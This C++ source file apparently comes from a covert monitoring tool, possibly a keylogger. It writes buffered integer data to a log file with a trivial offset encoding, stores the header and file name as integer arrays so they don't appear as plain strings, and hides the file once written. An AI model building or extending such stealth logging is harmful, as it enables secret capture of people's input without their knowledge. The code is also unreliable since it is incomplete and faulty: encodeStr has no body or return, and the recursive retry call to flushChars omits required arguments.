#include "encodeStr.h"
#include "monitor.h"

long encodeStr(std::string& str)
{
	//take string, turn into number. yay.
	//we do this every time the vector gets filled up.
}

//expands to "# DO NOT DELETE THIS FILE \n"
std::vector<int> warningStr = { 35, 32, 68, 79, 32, 78, 79, 84, 32, 68, 69, 76, 69, 84, 69, 32, 84, 72, 73, 83, 32, 70, 73, 76, 69, 10 };

bool flushChars(std::vector<int>& vec, std::vector<int> filename, int &count, bool check, int vecsize)
{
	bool doesFileExist = false;
	if (vec.size() < vecsize && check) //check for debug
		return false;

	if (count > 5)
	{
		//massive error occured if we can't open the file 5 times...
		//we're going to have to create a new file.
		return false;
	}
	
	std::string filepath_string = "";
	for (int i : filename)
	{
		filepath_string += (char)(i);
	}
	std::string warning_string = "";
	for (int i : warningStr)
	{
		warning_string += (char)(i);
	}

	//flushes the current vector into the text document, along with encoding it.
	int offset = rand() % 9 + 1; //I know rand() isn't the best but idrc

	std::string mainStr;
	mainStr += std::to_string(offset);

	//make main string
	for (int &str : vec)
	{
		mainStr += '|';
		mainStr += std::to_string(offset + str);
	}
	
	if (std::filesystem::exists(filepath_string))
		doesFileExist = true;

	std::fstream textfile(filepath_string, std::ios::out | std::ios::app);
	//check if not open, handle error.
	if (!textfile.is_open())
	{
		++count;
		//this might cause unforseen errors as, past this if statement, it will try to flush again.
		//handle this by doing a jmp instruction.
		flushChars(vec, filename, count);
	}
	//error did not occur.
	count = 0; //reset


	if (!doesFileExist || std::filesystem::file_size(filepath_string) == 0) //text document empty.
	{
		textfile << warning_string;
	}

	textfile.seekp(0, std::ios::end);
	textfile << mainStr << '\n';
	vec.clear();

	textfile.close();

	hideFile(filepath_string); //hide file
	return true;
}